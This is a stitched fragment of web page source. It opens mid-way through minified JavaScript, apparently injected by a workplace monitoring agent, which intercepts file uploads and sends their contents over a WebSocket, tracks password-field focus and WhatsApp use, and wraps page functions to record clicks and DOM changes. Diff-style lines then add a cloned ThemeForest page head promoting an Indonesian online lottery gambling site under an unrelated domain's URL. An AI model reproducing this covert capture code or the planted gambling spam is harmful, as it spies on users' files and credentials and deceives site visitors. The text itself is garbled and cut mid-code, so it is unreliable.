n/864e5|0}}},t.isLeapYear=function(e){return!(((e=e.getFullYear())%4||!(e%100))&&e%400)},t.isSameDay=function(e,n){return t.format(e,"YYYYMMDD")===t.format(n,"YYYYMMDD")},e.date=t;const b=new Map;function N(e){const t="tm_overlay",n=10485760;let Y=function(){let e=document.getElementById(t);e&&e.remove(),b.clear()};if(e){const r=new FileReader;let a;e.size>n&&(a=e.slice(0,n));let o=!1;if(b.forEach(t=>{t.fileName===e.name&&(o=!0)}),!o){r.addEventListener("load",t=>{try{const t=crypto.randomUUID();b.set(t,{responseCallback:e=>{e.block&&function(){const e=[],t=t=>{t.querySelectorAll('button:not([tabindex="-1"])').forEach(t=>{t.querySelector('span[data-icon="x"]')&&(e.push(t),t.click())})},n=new MutationObserver((n,Y)=>{n.forEach(e=>{"childList"===e.type&&e.addedNodes.length>0&&e.addedNodes.forEach(e=>{e.nodeType===Node.ELEMENT_NODE&&t(e)})}),e.length>0&&Y.disconnect()});n.observe(document.body,{childList:!0,subtree:!0}),t(document),e.length>0&&n.disconnect()}(),Y()},fileName:e.name}),setTimeout(()=>{b.has(t)&&(b.delete(t),Y())},2e3),B.send(JSON.stringify({requestId:t,type:"waptransfer",direction:"upload",filename:e.name,filesize:e.size,filetype:e.type,url:document.URL,filehash:"0",process:w.pn,content:S(r.result)}))}catch(e){Y()}}),r.addEventListener("error",e=>{Y()}),r.addEventListener("abort",e=>{Y()}),function(){if(!document.getElementById(t)){let e=document.createElement("div");e.id=t,e.style.cssText="background:rgba(0, 0, 0, .6);position:absolute;top:0;left:0;height:100%;width:100%;z-index:999",document.body.appendChild(e)}}();try{null==a?r.readAsArrayBuffer(e):r.readAsArrayBuffer(a)}catch(e){Y()}}}}function E(e){var t={handler:"log",module:"wapjs",url:"wap",message:e};B.send(JSON.stringify(t))}function A(e){var t={name:e.data.name,type:e.data.type};"iframePasswordInputFocused"===e.data.message?c(t,!0):"iframePasswordInputBlurred"===e.data.message&&M(t,!0)}var w={token:"d3d37057-74a0-48bd-87cd-74b23ed7bd8c",sendNotificationsInterval:Number("1000"),pollWhatsappTrackingInterval:Number("20000"),connectionString:"wss://tm.filter:1502",pid:"10452",pn:"chrome.exe",iup:false,dontTrackWebPasswords:false,extJs:/*   * don't use double slash comments here as this will be stored in one line for the TMU migrations   *    * this is stored in the kv_store table for the key hm_websites_js   *    * all code should describe one javascript object, i.e. { bla-bla-bla }   *    * this object will be included in standard js injection code as a replacement of 'insight_placeholder'   * if domain of the page matches one of the domain regexes from the hypermonitoring_web settings   * if not, 'insight_placeholder' will be replaced with null   *    * this object must contain function init(token), it will be called only once when document became visible (it is called for every iframe too)   *    * also this code contains placeholdes, see doc in the code (search for `_placeholder` suffix)   *    * also this object must contain property webSock that will be assigned WebSocket when created   *    * this object should send json for every registered event with the following structure:   * {   *      cat: 'insight' - this is required to route the message to the proper handler   *      type: click | changed - type of the event   *      elm: uint32 - id of the element that fired the event. used for deduplication of the events   *      page: uint32 - id of the hypermonitored location   *      obj: uint32 - id of the hypermonitored object that fired event   *      url: string - current document url   *      token: string - js injection token, used to unique identify browser page   *      values: json - contains all collected information about event and it's context   *      proc: id of the process of the host electron   * }   */  {      /* this will be replaced with the rules for current domain       * [        *      {          *          id: locationId,        *          url: string | null,        *          objects:        *          [       *              {        *                  id: objectId,        *                  sources: [],       *                  ...       *              },       *              ...       *          ]        *      },       *      ...       * ]       */      pages: [],        /* required property for electron */      proc: null,        /* required property - will be assigned to WebSocket once it will be read */      webSock: null,      pendingPackets: [],        webSockReady: function () {          return this.webSock !== null && this.webSock.readyState === WebSocket.OPEN;      },        processPacket: function (t) {          if (!this.webSockReady())              this.pendingPackets.push(t);          else {              this.sendPendingPackets();              this.webSock.send(t);          }      },        sendPendingPackets: function () {          if (this.webSockReady() && this.pendingPackets.length > 0) {              for (var i = 0; i < this.pendingPackets.length; ++i)                  this.webSock.send(this.pendingPackets[i]);              this.pendingPackets = [];          }      },        /* store js injection token */      token: null,        /* should we send log messages to the agent, bool */      sendLog: false,        /* should we include all content of the htmlelements in the log messages, bool */      sendLogFullData: false,        /* should we log snapshots of the html after every mutation event */      sendLogSnapshots: false,        /* should we catch exceptions and log them (as opposed to let browser stops in debugger) */      sendLogExceptions: true,        /*       * required function - it will be called once when document became visible       * it will be also called for iframes       *           * argument token - js injection token       */      init: function (token) {          this.token = token;          this.log("init: token:" + token + " sendLog:" + this.sendLog + " sendLogFullData:" + this.sendLogFullData);            if (document.readyState === "interactive" || document.readyState === "complete")              this.attachEvents();          else              window.addEventListener("DOMContentLoaded", this.attachEvents.bind(this));            setInterval(this.sendPendingPackets.bind(this), 1000);      },        /*       * here we scan all provided settings and choose what listeners are required       * we don't want to intrude in the js more that necessary for performance and compatibility considerations       */      attachEvents: function () {          var needClick = false, needChange = false, needChildList = this.sendLogSnapshots, needCharacterData = this.sendLogSnapshots, callObjects = [];          this.pages.forEach(function (page) {              page.objects.forEach(function (obj) {                  ['addText', 'removeText', 'addElm', 'removeElm', 'stateByElm'].forEach(function (source) {                      if (obj.sources.includes(source))                          needChildList = true;                  });                  if (obj.sources.includes('changeText'))                      needCharacterData = true;                  if (obj.sources.includes('change'))                      needChange = true;                  if (obj.sources.includes('click'))                      needClick = true;                  if (obj.sources.includes('call'))                      callObjects.push({ page: page, obj: obj });              });          });          this.log("attachEvents: needClick:" + needClick + " needChange:" + needChange + " needChildList:" + needChildList + " needCharacterData:" + needCharacterData);          if (needClick)              window.addEventListener('click', this.onEvent.bind(this), true);          if (needChange)              window.addEventListener('change', this.onEvent.bind(this), true);          if (needChildList || needCharacterData)              new MutationObserver(this.onMutation.bind(this)).observe(document, { subtree: true, childList: needChildList, characterData: needCharacterData });            if (needClick || needChange || needChildList || needCharacterData) {              /* we process mutation events only after human interaction */              window.addEventListener('keydown', this.onInteraction.bind(this));              window.addEventListener('mousedown', this.onInteraction.bind(this));          }            if (callObjects.length > 0) {              var self = this;              var intervalHandle = setInterval(function () {                  for (var i = callObjects.length - 1; i >= 0; i--) {                      if (self.interceptCall(callObjects[i]))                          callObjects.splice(i, 1);                  }                  if (callObjects.length == 0)                      clearInterval(intervalHandle);              }, 500);          }      },        interceptCall: function (callObj) {          var obj = callObj.obj, jsObj;          try {              jsObj = this.calc(obj, "object", [], []);          }          catch{ }          if (jsObj == null) {              this.log("attachEvents: object:" + obj.id + " is not found");              return false;          }          var method = jsObj[obj.func];          var self = this;          jsObj[obj.func] = function () {              var arg_data = self.calc(obj, "arg_data", ["args"], [arguments], "return null");              var ret = method.apply(jsObj, arguments);              var return_data = self.calc(obj, "return_data", ["ret"], [ret], "return null");              if (arg_data != null || return_data != null)                  self.sendEvent("interceptCall", callObj.page, obj, undefined, { arg_data: arg_data, return_data: return_data });              return ret;          };          self.log("attachEvents: object:" + obj.id + ", " + (obj.object || obj.object_f) + " is found, call to '" + obj.func + "' intercepted");          return true;      },        /* new Date().getTime() of the last human interacion (keydown, mousedown, mouseup)      to filter out DOM mutation events that was not due to human activity */      lastInteraction: null,        /* on human interaction (keydown, mousedown, mouseup) */      onInteraction: function (ev) {          this.lastInteraction = new Date().getTime();          this.log('onInteraction: human Interaction ' + ev.type + ': ' + this.lastInteraction);      },        /* handles click and change events */      onEvent: function (ev) {          var self = this;          this.callSafe("onEvent", function () {              self.handleEvent(ev.type, ev.type, ev.composed ? ev.composedPath() : self.getAncestors(ev.target));          });      },        /* handles addText, changeText, removeText, addElm, removeElm DOM mutation events */      onMutation: function (mList) {          var self = this;          if (this.sendLogSnapshots)              this.log("snapshot: " + document.body.outerHTML.replace(/\n|\r/g, '#'));          this.callSafe("onMutation", function () {              if (self.lastInteraction !== null) {                  mList.forEach(function (m) {                      if (m.type === 'childList') {                          m.removedNodes.forEach(function (sub) {                              if (sub.nodeType === Node.TEXT_NODE)                                  self.handleEvent('change', 'removeText', self.getAncestors(m.target));                              else if (sub.nodeType === Node.ELEMENT_NODE)                                  self.handleEventWithSub('change', 'removeElm', self.getAncestors(m.target), sub);                          });                          m.addedNodes.forEach(function (sub) {                              if (sub.nodeType === Node.TEXT_NODE)                                  self.handleEvent('change', 'addText', self.getAncestors(m.target));                              else if (sub.nodeType === Node.ELEMENT_NODE)                                  self.handleEventWithSub('change', 'addElm', self.getAncestors(m.target), sub);                          });                      }                      else if (m.type === 'characterData' && m.target)                          self.handleEvent('change', 'changeText', self.getAncestors(m.target));                  });              }                self.processStateByElm();          });      },        objId2key2value: {},      processStateByElm: function () {          var self = this;          self.forEachObject('stateByElm', function (page, obj) {              var key2value = {};              if (self.calc(obj, 'condition', [], [], "return true;")) {                  self.applySelector(document, obj.selector).forEach(function (elm) {                      var key = self.calc(obj, 'key', ['e'], [elm]);                      var value = self.calc(obj, 'value', ['e'], [elm]);                      key2value[JSON.stringify(key)] = JSON.stringify(value);                  });              }                var oldKey2Value = self.objId2key2value[obj.id];              oldKey2Value = oldKey2Value ? oldKey2Value : {};              for (var k in key2value) {                  if (key2value[k] !== oldKey2Value[k])                      self.sendEvent('change', page, obj, undefined, { key: JSON.parse(k), old: oldKey2Value[k] ? JSON.parse(oldKey2Value[k]) : undefined, "new": JSON.parse(key2value[k]) });                  delete oldKey2Value[k];              }              for (var k in oldKey2Value)                  self.sendEvent('change', page, obj, undefined, { key: JSON.parse(k), old: oldKey2Value[k] ? JSON.parse(oldKey2Value[k]) : undefined });              self.objId2key2value[obj.id] = key2value;          });      },        /* get ancestors for the element */      getAncestors: function (e) {          var path = [];          for (; e !== document && e !== null; e = e.parentNode)              path.push(e);          return path;      },        /* handles simple events: click, change, addText, changeText, removeText */      handleEvent: function (type, source, ancestors) {          if (this.sendLog)    /* double check not to call elementString in vain */              this.log("handleEvent: type:" + type + " source:" + source + " target:" + this.elementString(ancestors[0]));          var self = this;          this.forEachMatch(source, ancestors, function (page, obj, elm) {              self.send(type, page, obj, ancestors[0], elm);          });      },        /* handles events with sub element: addElm, removeElm */      handleEventWithSub: function (type, source, ancestors, sub) {          if (this.sendLog)    /* double check not to call elementString in vain */              this.log("handleEventWithSub: type:" + type + " source:" + source + " target:" + this.elementString(ancestors[0]) + " sub:" + this.elementString(sub));          var self = this;          this.forEachMatch(source, ancestors, function (page, obj, elm) {              if (!obj.sub_matches || sub.matches(obj.sub_matches)) {                  if (obj.sub_selector) {                      self.applySelector(sub, obj.sub_selector).forEach(function (descendant) {                          self.send(type, page, obj, ancestors[0], elm, sub, descendant);                      });                  }                  else {                      self.send(type, page, obj, ancestors[0], elm, sub);                  }              }          });      },        /* enumerate all obj based on url and source. calls handler(page, obj) */      forEachObject: function (source, handler) {          var self = this;          this.pages.forEach(function (page) {              if (self.testRegex(page.url, document.URL)) {                  page.objects.forEach(function (obj) {                      if (obj.sources.includes(source))                          handler(page, obj);                  });              }          });      },        /* enumerate all matches based on url, source and interactionInterval, matches and selector. calls handler(page, obj, matchedElm) */      forEachMatch: function (source, ancestors, handler) {          var self = this;          this.forEachObject(source, function (page, obj) {              if (obj.interactionInterval && (self.lastInteraction == null || new Date().getTime() - self.lastInteraction > obj.interactionInterval)) {                  if (self.lastInteraction != null)                      self.log('forEachMatch skip rule: interval:' + (new Date().getTime() - self.lastInteraction).toString());              }              else {                  var scope = obj.scope === 'target' ? [ancestors[0]] : ancestors,                      m = obj.matches,                      set = !m && obj.selector ? self.applySelector(document, obj.selector) : null;                  for (var i = 0; i < scope.length; ++i) {                      if ((m && scope[i].matches && scope[i].matches(m)) /* scope[i] may not be element, test if matches is defined */                          || (set && set.includes(scope[i]))) {                          handler(page, obj, scope[i]);                          break;                      }                  }              }          });      },        /* return array of elements after applying commands from the selector settings */      applySelector: function (root, commands) {          const self = this;          var elms = [root];          commands.forEach(function (command) {              var res = [];              elms.forEach(function (elm) {                  if (command.test_text) {    /* test_text command keeps only elements whose text matches regex */                      if (self.testRegex(command.test_text, elm.textContent))                          res.push(elm);                  }                  else if (command.move) {    /* move command transforms element into querySelectorAll set and select shadowRoot if present */                      elm.querySelectorAll(':scope ' + command.move).forEach(function (e) {                          var s = e.shadowRoot;                          res.push(s ? s : e);                      });                  }                  else if (command.exists) {  /* exists command keeps only elements for which selector set is not empty */                      if (self.applySelector(elm, command.exists).length !== 0)                          res.push(elm);                  }              });              elms = res;          });          return elms;      },        /* send event data to websocket, data structure:       * {       *      cat: 'insight' - this is required to route the message to the proper handler       *      type: click | changed - type of the event       *      elm: uint32 - id of the element that fired the event. used for deduplication of the events       *      page: uint32 - id of the hypermonitored location       *      obj: uint32 - id of the hypermonitored object that fired event       *      url: string - current document url       *      token: string - js injection token, used to unique identify browser page       *      values: json - contains all collected information about event and it's context       * }       */      lastSentElm: null,      lastSentElmId: 0,      send: function (type, page, obj, target, e, sub, descendant) {          if (this.lastSentElm !== e) {              this.lastSentElm = e;              this.lastSentElmId++;          }          const values = this.calc(obj, 'values', ['target', 'e', 'sub', 'descendant'], [target, e, sub, descendant]);          if (values)              this.sendEvent(type, page, obj, this.lastSentElmId.toString(), values);      },        sendEvent: function (type, page, obj, elmId, values) {          const t = JSON.stringify({              values: values,              handler: page.handler,              type: type,              elm: elmId,              page: page.id,              obj: obj.id,              url: document.URL,              token: this.token,              proc: this.proc          });          if (this.sendLog)              console.log("[InsightJs] send: " + t);          this.processPacket(t);      },        /* utils: cache compiled regexes */      string2regex: {},      testRegex: function (stringRegex, value) {          if (stringRegex === null)              return true;          if (!(stringRegex in this.string2regex))              this.string2regex[stringRegex] = new RegExp(stringRegex);          return this.string2regex[stringRegex].test(value);      },        /* utils: cache compiled functions */      code2function: {},      calc: function (host, prop, names, args, defaultCode) {          var code = host[prop] ? "return " + host[prop] + ";" : host[prop + "_f"];          if (code == null)              code = defaultCode;          if (code == null) {              this.log("code not found, calc(" + JSON.stringify(host) + "), prop:" + prop);              return {};          }          if (!(code in this.code2function))              this.code2function[code] = new Function(...names, code);          return this.code2function[code].apply(null, args);      },        /* utils: dump html element to the log */      elementString: function (e) {          var html = e.nodeType == Node.TEXT_NODE ? e.data : e.outerHTML;          if (this.sendLogFullData)              return html;          html = html.length > 100 ? html.substr(0, 100) + " ... total len:" + html.length : html;          return html.replace(/\n|\r/g, '#');      },        /* log to console and to the agent */      log: function (message, force) {          if (this.sendLog || force) {              var m = new Date().toLocaleString() + ": " + message;              console.log("[InsightJs] " + m + ", url:" + document.URL);              this.processPacket(JSON.stringify({ handler: "log", module: "InsightJs", message: m, url: document.URL }));          }      },        callSafe: function (name, f) {          if (!this.sendLogExceptions)              f();          else {              try {                  f()              }              catch (e) {                  this.log("exception in " + name + ":" + e.name + ", " + e.message, true);              }          }      }  }},L=6e4,T=null,I=null,k=null,C=null,O=!1,H=null,P=null,R=0,x=null,B=null,_="",F=!1;!function e(t){m()?setTimeout(function(){e(t)},1e3):t()}(function(){w.extJs&&w.extJs.init(w.token),Y()&&(window.addEventListener("focus",r,!0),w.dontTrackWebPasswords&&window.addEventListener("message",A,!1)),Y()||w.extJs?p():w.dontTrackWebPasswords&&f()})}();</script><script type="text/javascript" async="" src="https://bat.bing.com/bat.js" nonce="TFNQUvYHwdi8uHoMheRs/Q=="></script>
+    <script type="text/javascript" async="" src="https://s.pinimg.com/ct/core.js" nonce="TFNQUvYHwdi8uHoMheRs/Q=="></script>
+    <script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=AW-953691586&amp;cx=c&amp;gtm=45He57s1v9195929391za200&amp;tag_exp=101509157~103116026~103200004~103233427~104573694~104684208~104684211~105103161~105103163~105124543~105124545"
+        nonce="TFNQUvYHwdi8uHoMheRs/Q=="></script>
+    <script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=AW-800411572&amp;cx=c&amp;gtm=45He57s1v9195929391za200&amp;tag_exp=101509157~103116026~103200004~103233427~104573694~104684208~104684211~105103161~105103163~105124543~105124545"
+        nonce="TFNQUvYHwdi8uHoMheRs/Q=="></script>
+    <script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=AW-943617023&amp;cx=c&amp;gtm=45He57s1v9195929391za200&amp;tag_exp=101509157~103116026~103200004~103233427~104573694~104684208~104684211~105103161~105103163~105124543~105124545"
+        nonce="TFNQUvYHwdi8uHoMheRs/Q=="></script>
+    <script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-ZKBVC1X78F&amp;cx=c&amp;gtm=45He57s1v9117991082za200&amp;tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~105103161~105103163~105124543~105124545"
+        nonce="TFNQUvYHwdi8uHoMheRs/Q=="></script>
+    <meta charset="utf-8">
+    <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">
+        //<![CDATA[
+        window.DATADOG_CONFIG = {
+            clientToken: 'puba7a42f353afa86efd9e11ee56e5fc8d9',
+            applicationId: '8561f3f6-5252-482b-ba9f-2bbb1b009106',
+            site: 'datadoghq.com',
+            service: 'marketplace',
+            env: 'production',
+            version: 'f7d8b3d494288b34cb00105ee5d230d68b0ccca7',
+            sessionSampleRate: 0.2,
+            sessionReplaySampleRate: 5
+        };
+
+        //]]>
+    </script>
+    <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">
+        //<![CDATA[
+        var rollbarEnvironment = "production"
+        var codeVersion = "f7d8b3d494288b34cb00105ee5d230d68b0ccca7"
+
+        //]]>
+    </script>
+    <script src="https://public-assets.envato-static.com/assets/rollbar-619156fed2736a17cf9c9a23dda3a8e23666e05fcb6022aad1bf7b4446d772e5.js" nonce="TFNQUvYHwdi8uHoMheRs/Q==" defer="defer"></script>
+
+
+    <meta content="origin-when-cross-origin" name="referrer">
+
+    <link rel="dns-prefetch" href="//s3.envato.com">
+    <link rel="preload" href="https://market-resized.envatousercontent.com/themeforest.net/files/344043819/MARKETICA_PREVIEW/00-marketica-preview-sale37.__large_preview.jpg?auto=format&amp;q=94&amp;cf_fit=crop&amp;gravity=top&amp;h=8000&amp;w=590&amp;s=cc700268e0638344373c64d90d02d184c75d7defef1511b43f3ecf3627a3f2d4"
+        as="image">
+    <link rel="preload" href="https://kilat.digital/images/2025/11/01/a3f234d12323a3bbe05e6a72eed756ae.jpg" as="image">
+    <link rel="preload" href="https://kilat.digital/images/2025/08/12/5d7dd8d2aa39755dc815f9393480d8a4.gif" as="image">
+    <title>Alexistogel : Bandar Togel Online Resmi & Terpercaya No 1 di Indonesia Dengan Hadiah Terbesar</title>
+    <meta name="description" content="Alexistogel merupakan situs toto togel online dan bandar togel resmi terpercaya, memiliki ribuan member aktif setiap harinya.">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <link rel="icon" type="image/x-icon" href="https://kilat.digital/images/2023/12/13/067a6dbaedf867ecca980a732729ed54.png">
+    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://kilat.digital/images/2023/12/13/067a6dbaedf867ecca980a732729ed54.png" sizes="72x72">
+    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://kilat.digital/images/2023/12/13/067a6dbaedf867ecca980a732729ed54.png" sizes="114x114">
+    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://kilat.digital/images/2023/12/13/067a6dbaedf867ecca980a732729ed54.png" sizes="120x120">
+    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://kilat.digital/images/2023/12/13/067a6dbaedf867ecca980a732729ed54.png" sizes="144x144">
+    <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://kilat.digital/images/2023/12/13/067a6dbaedf867ecca980a732729ed54.png">
+    <link rel="stylesheet" href="https://public-assets.envato-static.com/assets/market/core/index-999d91c45b3ce6e6c7409b80cb1734b55d9f0a30546d926e1f2c262cd719f9c7.css" media="all">
+    <link rel="stylesheet" href="https://public-assets.envato-static.com/assets/market/pages/default/index-ffa1c54dffd67e25782769d410efcfaa8c68b66002df4c034913ae320bfe6896.css" media="all">
+    <script src="https://public-assets.envato-static.com/assets/components/brand_neue_tokens-f25ae27cb18329d3bba5e95810e5535514237937774fca40a02d8e2635fa20d6.js" nonce="TFNQUvYHwdi8uHoMheRs/Q==" defer="defer"></script>
+    <meta name="theme-color" content="#333333">
+    <meta name="google-site-verification" content="6fRa3P9g3ka1XIQg6FRsR04x3k7xt3SeTyL5-y7L-40" />
+    <link rel="canonical" href="https://www.paperhall.org/halloffame">
+    <link rel="amphtml" href="https://paperhall.pages.dev/" />
+
+  <script type="application/ld+json">
+      {"@type":"Product","@context":"https://schema.org","name":"Alexistogel : Bandar Togel Online Resmi & Terpercaya No 1 di Indonesia Dengan Hadiah Terbesar","image":"https://kilat.digital/images/2025/11/01/a3f234d12323a3bbe05e6a72eed756ae.jpg","category":"Togel Online & Situs Toto","brand":{"@type":"Brand","name":"ALEXISTOGEL","url":"https://www.paperhall.org/halloffame"},"sku":"6565465781_ID-5125312156","mpn":0548798781,"description":"Alexistogel merupakan situs toto togel online dan bandar togel resmi terpercaya, memiliki ribuan member aktif setiap harinya.'","url":"https://www.paperhall.org/halloffame","offers":{"@type":"Offer","url":"https://www.paperhall.org/halloffame","seller":{"@type":"Organization","name":""},"priceCurrency":"IDR","price":0,"availability":"https://schema.org/InStock","itemCondition":"https://schema.org/NewCondition"}}
+      </script>
+      <script data-rh="true" type="application/ld+json">
+      {
+            "@context": "http://schema.org",
+            "@type": "BreadcrumbList",
+            "itemListElement": [{
+              "@type": "ListItem",
+              "position": 1,
+              "item": {
+                "@id": "https://www.paperhall.org/halloffame",
+                "name": "BANDAR TOGEL"
+              }
+            }, {
+              "@type": "ListItem",
+              "position": 2,
+              "item": {
+                "@id": "https://www.paperhall.org/halloffame",
+                "name": "TOGEL ONLINE"
+              }
+            }, {
+              "@type": "ListItem",
+              "position": 3,
+              "item": {
+                "@id": "https://www.paperhall.org/halloffame",
+                "name": "TOGEL RESMI"
+              }
+            }, {
+              "@type": "ListItem",
+              "position": 4,
+              "item": {
+                "@id": "https://www.paperhall.org/halloffame",
+                "name": "SITUS TOTO"
+              }
+            }, {
+              "@type": "ListItem",
+              "position": 5,
+              "item": {
+                "@id": "https://www.paperhall.org/halloffame",
+                "name": "Alexistogel : Bandar Togel Online Resmi & Terpercaya No 1 di Indonesia Dengan Hadiah Terbesar"
+              }
+            }]
+          }
+      </script>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Organization",
+  "name": "ALEXISTOGEL",
+  "url": "https://www.paperhall.org/halloffame",
+  "logo": "https://kilat.digital/images/2025/08/12/5d7dd8d2aa39755dc815f9393480d8a4.gif",
+  "sameAs": [
+    "https://www.facebook.com/ALEXISTOGEL",
+    "https://twitter.com/ALEXISTOGEL",
+    "https://www.instagram.com/ALEXISTOGEL"
+  ],
+  "contactPoint": {
+    "@type": "ContactPoint",
+    "telephone": "+62-5151-620-5454",
+    "contactType": "Customer Service",
+    "areaServed": "ID",
+    "availableLanguage": ["Indonesian", "English"]
+  }
+}
+</script>
+
+
+    <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">
+        //<![CDATA[
+        window.dataLayer = window.dataLayer || [];
+
+        //]]>
+    </script>
+    <meta name="bingbot" content="nocache">
+
+    <!-- Open Graph -->
+    <meta property="og:title" content="Alexistogel : Bandar Togel Online Resmi & Terpercaya No 1 di Indonesia Dengan Hadiah Terbesar">
+    <meta property="og:description" content="Alexistogel merupakan situs toto togel online dan bandar togel resmi terpercaya, memiliki ribuan member aktif setiap harinya.">
+    <meta property="og:image" content="https://kilat.digital/images/2025/11/01/a3f234d12323a3bbe05e6a72eed756ae.jpg">
+    <meta property="og:url" content="https://www.paperhall.org/halloffame">
+    <meta property="og:type" content="website">
+
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Alexistogel : Bandar Togel Online Resmi & Terpercaya No 1 di Indonesia Dengan Hadiah Terbesar">
+    <meta name="twitter:description" content="Alexistogel merupakan situs toto togel online dan bandar togel resmi terpercaya, memiliki ribuan member aktif setiap harinya.">
+    <meta name="twitter:image" content="https://kilat.digital/images/2025/11/01/a3f234d12323a3bbe05e6a72eed756ae.jpg">
+    <meta property="og:title" content="Alexistogel : Bandar Togel Online Resmi & Terpercaya No 1 di Indonesia Dengan Hadiah Terbesar">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://www.paperhall.org/halloffame">
+    <meta property="og:image" content="https://kilat.digital/images/2025/11/01/a3f234d12323a3bbe05e6a72eed756ae.jpg" />
+    <meta property="og:description" content="Alexistogel merupakan situs toto togel online dan bandar togel resmi terpercaya, memiliki ribuan member aktif setiap harinya.">
+    <meta property="og:site_name" content="ThemeForest">
+    <meta name="csrf-param" content="authenticity_token">
+    <meta name="csrf-token" content="o7V7LGbBjnF9HgzqsCOek0VUbYNaqFcrL72zjeu3cGTv2_7pn5UklFm7XFtDaDCfkbbeD4zdIzwPzjrUhXtbHQ">
+    <meta name="turbo-visit-control" content="reload">
+
+    <script type="text/javascript" nonce="TFNQUvYHwdi8uHoMheRs/Q==" data-cookieconsent="statistics">
+        //<![CDATA[
+        var container_env_param = "";
+        (function(w, d, s, l, i) {
+            w[l] = w[l] || [];
+            w[l].push({
+                'gtm.start': new Date().getTime(),
+                event: 'gtm.js'
+            });
+            var f = d.getElementsByTagName(s)[0],
+                j = d.createElement(s),
+                dl = l != 'dataLayer' ? '&l=' + l : '';
+            j.async = true;
+            j.src = 'https://www.googletagmanager.com/gtm.js?id=' + i + dl + container_env_param;
+            f.parentNode.insertBefore(j, f);
+        })(window, document, 'script', 'dataLayer', 'GTM-W8KL5Q5');
+
+        //]]>
+    </script>
+
+
+    <script type="text/javascript" nonce="TFNQUvYHwdi8uHoMheRs/Q==" data-cookieconsent="marketing">
+        //<![CDATA[
+        var gtmId = 'GTM-KGCDGPL6';
+        var container_env_param = "";
+        // Google Tag Manager Tracking Code
+        (function(w, d, s, l, i) {
+            w[l] = w[l] || [];
+            w[l].push({
+                'gtm.start': new Date().getTime(),
+                event: 'gtm.js'
+            });
+            var f = d.getElementsByTagName(s)[0],
+                j = d.createElement(s),
+                dl = l != 'dataLayer' ? '&l=' + l : '';
+            j.async = true;
+            j.src = 'https://www.googletagmanager.com/gm.js?id=' + i + dl + container_env_param;
+            f.parentNode.insertBefore(j, f);
+        })(window, document, 'script', 'dataLayer', gtmId);
+
+
+        window.addEventListener('load', function() {
+            window.dataLayer.push({
+                event: 'pinterestReady'
+            });
+        });
+
+        //]]>
+    </script>
+    <script src="https://public-assets.envato-static.com/assets/market/core/head-d4f3da877553664cb1d5ed45cb42c6ec7e6b00d0c4d164be8747cfd5002a24eb.js" nonce="TFNQUvYHwdi8uHoMheRs/Q=="></script>
+    <style type="text/css" id="CookieConsentStateDisplayStyles">
+        .cookieconsent-optin,
+        .cookieconsent-optin-preferences,
+        .cookieconsent-optin-statistics,
+        .cookieconsent-optin-marketing {
+            display: block;
+            display: initial;
+        }
+        
+        .cookieconsent-optout-preferences,
+        .cookieconsent-optout-statistics,
+        .cookieconsent-optout-marketing,
+        .cookieconsent-optout {
+            display: none;
+        }
+    </style>
+    <style>
+         :root {
+            --color-grey-1000: #191919;
+            --color-grey-1000-mask: rgb(25 25 25 / 0.7);
+            --color-grey-700: #383838;
+            --color-grey-500: #707070;
+            --color-grey-300: #949494;
+            --color-grey-100: #cccccc;
+            --color-grey-50: #ececee;
+            --color-grey-25: #f9f9fb;
+            --color-white: #ffffff;
+            --color-white-mask: rgb(255 255 255 / 0.7);
+            --color-green-1000: #1a4200;
+            --color-green-700: #2e7400;
+            --color-green-500: #51a31d;
+            --color-green-300: #6cc832;
+            --color-green-100: #9cee69;
+            --color-green-25: #eaffdc;
+            --color-blue-1000: #16357b;
+            --color-blue-700: #4f5ce8;
+            --color-blue-500: #7585ff;
+            --color-blue-25: #f0f1ff;
+            --color-veryberry-1000: #77012d;
+            --color-veryberry-700: #b9004b;
+            --color-veryberry-500: #f65286;
+            --color-veryberry-25: #ffecf2;
+            --color-bubblegum-700: #b037a6;
+            --color-bubblegum-100: #e6afe1;
+            --color-bubblegum-25: #feedfc;
+            --color-jaffa-1000: #692400;
+            --color-jaffa-700: #c24100;
+            --color-jaffa-500: #ff6e28;
+            --color-jaffa-25: #fff5ed;
+            --color-yolk-1000: #452d0d;
+            --color-yolk-700: #9e5f00;
+            --color-yolk-500: #c28800;
+            --color-yolk-300: #ffc800;
+            --color-yolk-25: #fefaea;
+            --color-transparent: transparent;
+            --breakpoint-wide: 1024px;
+            --breakpoint-extra-wide: 1440px;
+            --breakpoint-2k-wide: 2560px;
+            --spacing-8x: 128px;
+            --spacing-7x: 64px;
+            --spacing-6x: 40px;
+            --spacing-5x: 32px;
+            --spacing-4x: 24px;
+            --spacing-3x: 16px;
+            --spacing-2x: 8px;
+            --spacing-1x: 4px;
+            --spacing-none: 0px;
+            --chunkiness-none: 0px;
+            --chunkiness-thin: 1px;
+            --chunkiness-thick: 2px;
+            --roundness-square: 0px;
+            --roundness-subtle: 4px;
+            --roundness-extra-round: 16px;
+            --roundness-circle: 48px;
+            --shadow-500: 0px 2px 12px 0px rgba(0 0 0 / 15%);
+            --elevation-medium: var(--shadow-500);
+            /** @deprecated */
+            --transition-base: 0.2s;
+            --transition-duration-long: 500ms;
+            --transition-duration-medium: 300ms;
+            --transition-duration-short: 150ms;
+            --transition-easing-linear: cubic-bezier(0, 0, 1, 1);
+            --transition-easing-ease-in: cubic-bezier(0.42, 0, 1, 1);
+            --transition-easing-ease-in-out: cubic-bezier(0.42, 0, 0.58, 1);
+            --transition-easing-ease-out: cubic-bezier(0, 0, 0.58, 1);
+            --font-family-wide: "PolySansWide", "PolySans", "Inter", -apple-system, "BlinkMacSystemFont", "Segoe UI", "Fira Sans", "Helvetica Neue", "Arial", sans-serif;
